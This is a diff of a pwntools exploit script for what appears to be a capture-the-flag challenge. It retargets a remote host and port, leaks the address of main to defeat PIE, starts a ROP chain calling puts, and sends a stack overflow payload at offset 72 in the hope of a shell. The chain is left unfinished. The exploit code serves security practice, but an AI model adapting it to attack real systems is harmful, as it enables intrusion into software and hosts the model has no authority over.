@@ -1,6 +1,6 @@
 from pwn import *
-HOST='103.167.136.75'
-PORT=11201
+HOST='103.185.44.42'
+PORT=11106
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -33,7 +33,7 @@ continue
 '''.format(**locals())
 
 # Binary filename
-exe = './soal'
+exe = './chall'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
@@ -44,25 +44,39 @@ context.log_level = 'debug'
 # ===========================================================
 
 # Lib-C library, can use pwninit/patchelf to patch binary
-# libc = ELF("./libc.so.6")
-# ld = ELF("./ld-2.27.so")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-aarch64.so.1")
 
 # Pass in pattern_size, get back EIP/RIP offset
-offset = 40
-win = 0x004011a1
-rop = ROP(elf)
+offset = 72
+
 # Start program
 io = start()
 
 # Build the payload
+
+# print(elf.got)
+# print(elf.symbols)
+
+# Send the payload
+print(io.recvuntil(b"gaming "))
+main = int(io.recvline().decode().strip(), 16)
+
+elf.address = main - elf.sym['main']
+
+rop = ROP(elf)
+rop.call("puts", [0x1234])
+
+print(rop.dump())
+
+info("main: " + hex(main))
+
 payload = flat({
     offset: [
-        rop.chain()
+        # rop.chain()
     ]
 })
 
-# Send the payload
-# io.sendlineafter(b'}\n', payload)
-io.sendline(payload)
+io.send(payload)
 # Got Shell?
 io.interactive()
